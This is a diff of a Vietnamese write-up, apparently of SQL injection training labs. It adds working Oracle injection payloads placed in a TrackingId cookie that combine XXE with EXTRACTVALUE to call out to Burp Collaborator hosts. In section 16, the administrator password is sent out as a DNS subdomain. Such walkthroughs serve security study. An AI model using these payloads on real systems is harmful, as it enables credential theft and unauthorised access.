@@ -165,23 +165,61 @@ Bruteforce password: Thêm `'%3bSELECT CASE WHEN substr(password,1,1)='a' THEN p
 Tiến hành tương tự với các ký tự từ 2 đến 20, ta thu được password=afwrv9geoqal4yozoxw0. Sử dụng username và password có được để đăng nhập, kết quả thành công.
 
 # 15. Blind SQL injection with out-of-band interaction
+(Lưu ý: các đoạn code bên dưới trong thực tế đều được URL encode)
+
 Thử thực hiện DNS lookup với trường hợp database là Oracle:
 
-Thử chèn thêm đoạn code sau vào sau tracking cookie:
+Thay đổi cookie TrackingId thành:
 ```
-3BSELECT+EXTRACTVALUE%28xmltype%28%27%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE+root+%5B+%3C%21ENTITY+%25+remote+SYSTEM+%22http%3A%2F%2Fgk4lihowe69pkkgl7fluaewn0e65zto.oastify.com%2F%22%3E+%25remote%3B%5D%3E%27%29%2C%27%2Fl%27%29+FROM+dual--
+TrackingId=abc';SELECT EXTRACTVALUE(xmltype('
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://gk4lihowe69pkkgl7fluaewn0e65zto.oastify.com/"> %remote;]>
+'),'/l') FROM dual--
 ```
-tương ứng với
+
+Kiểm tra trong Burp Collaborator client, không có gì được hiển thị. Có thể website đã chặn việc thực thi nhiều câu lệnh query trong chức năng tracking. Như vậy, ta thay `';` thành `' UNION` rồi thử lại, kết quả câu lệnh query trở thành:
+
 ```
-';SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://gk4lihowe69pkkgl7fluaewn0e65zto.oastify.com/"> %remote;]>'),'/l') FROM dual--
+TrackingId=abc' UNION SELECT EXTRACTVALUE(xmltype('
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://gk4lihowe69pkkgl7fluaewn0e65zto.oastify.com/"> %remote;]>
+'),'/l') FROM dual--
 ```
-Kiểm tra trong BurpCollaborator, kết quả không thành công. Có thể website đã chặn việc thực thi nhiều câu lệnh query trong chức năng Tracking. Như vậy, ta thay `';` thành `' UNION` rồi thử lại, kết quả câu lệnh query được thực thi thành công và trong Burp Collaborator đã nhận được request.
+
+Kiểm tra, ta thấy đoạn query được thực thi thành công và trong Burp Collaborator đã nhận được request.
 
 ![image](https://user-images.githubusercontent.com/103978452/202646694-d96b5591-b9d3-4587-8e31-92ee12948b39.png)
 
 # 16. Blind SQL injection with out-of-band data exfiltration
+(Lưu ý: các đoạn code bên dưới trong thực tế đều được URL encode)
 
+Thử với payload như trong bài #15, ta thấy kết quả vẫn thành công. Như vậy database được sử dụng là Oracle.
 
+Payload ban đầu:
+```
+TrackingId=abc' UNION SELECT EXTRACTVALUE(xmltype('
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://.xde2byhd7n26d1920web3vp4tvzmwal.oastify.com"> %remote;]>
+'),'/l') FROM dual--
+```
+
+Ta thay đổi payload thành:
+```
+TrackingId=abc' UNION SELECT EXTRACTVALUE(xmltype('
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||'helloworld'||'.xde2byhd7n26d1920web3vp4tvzmwal.oastify.com"> %remote;]>
+'),'/l') FROM dual--
+```
+
+Chú ý đoạn URL đã được sửa đổi, bằng cách đặt "helloworld" làm subdomain. Khi kiểm tra BurpCollaborator, ta thấy một request đã được gửi đến, có chứa đoạn text "helloworld"
+
+![image](https://user-images.githubusercontent.com/103978452/202651658-09315bc1-60ca-4632-9174-f933a2ec9c45.png)
+
+Để lấy password của administrator, ta sẽ thay đoạn `"helloword"` thành `(SELECT password FROM users WHERE username="administrator")`. Sau khi gửi request, kiểm tra Burp Collaborator client thì thấy một đoạn subdomain đã được thêm vào. Đó chính là password của administrator.
+
+![image](https://user-images.githubusercontent.com/103978452/202649060-fb5382f5-b0db-49bc-9437-45cd09480782.png)
+
+Sử dụng thông tin đã có để đăng nhập, kết quả thành công.
 
 # 17. SQL injection with filter bypass via XML encoding
 Dùng BurpSuite để bắt request check stock. Ta thấy phần body của request là một đoạn XML gồm productId và storeId. Khi ta thêm `&#45;&#45;` (tương ứng -- khi XML encode) vào sau storeId, kết quả trả vễ vẫn như bình thường. Như vậy, website có lỗ hổng SQLi.
